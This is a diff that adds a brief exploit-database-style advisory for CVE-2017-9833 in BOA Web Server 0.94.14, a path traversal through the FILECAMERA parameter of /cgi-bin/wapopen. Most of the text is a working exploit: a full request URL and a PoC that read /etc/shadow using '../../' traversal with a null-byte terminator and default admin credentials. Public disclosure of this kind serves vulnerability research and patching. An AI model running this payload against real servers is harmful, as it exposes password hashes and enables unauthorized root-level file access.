@@ -1,0 +1,26 @@
+BOA Web Server 0.94.14 - Access to arbitrary files as privileges
+
+Title: Vulnerability in BOA Webserver 0.94.14
+Date: 20-06-2017
+Status: Vendor contacted, patch available
+Scope: Arbitrary file access
+Platforms: Unix
+Author: Miguel Mendez Z
+Vendor Homepage: http://www.boa.org
+Version: Boa Webserver 0.94.14rc21
+CVE: CVE-2017-9833
+
+
+Vulnerability description
+-------------------------
+-We can read any file located on the server
+The server allows the injection of "../.." using the FILECAMERA variable sent by GET to read files with root privileges. Without using access credentials
+
+Vulnerable variable:
+FILECAMERA=../../etc/shadow%00
+
+Exploit link:
+/cgi-bin/wapopen?B1=OK&NO=CAM_16&REFRESH_TIME=Auto_00&FILECAMERA=../../etc/shadow%00&REFRESH_HTML=auto.htm&ONLOAD_HTML=onload.htm&STREAMING_HTML=streaming.htm&NAME=admin&PWD=admin&PIC_SIZE=0
+
+Poc:
+http://127.0.0.1/cgi-bin/wapopen?B1=OK&NO=CAM_16&REFRESH_TIME=Auto_00&FILECAMERA=../../etc/shadow%00&REFRESH_HTML=auto.htm&ONLOAD_HTML=onload.htm&STREAMING_HTML=streaming.htm&NAME=admin&PWD=admin&PIC_SIZE=0
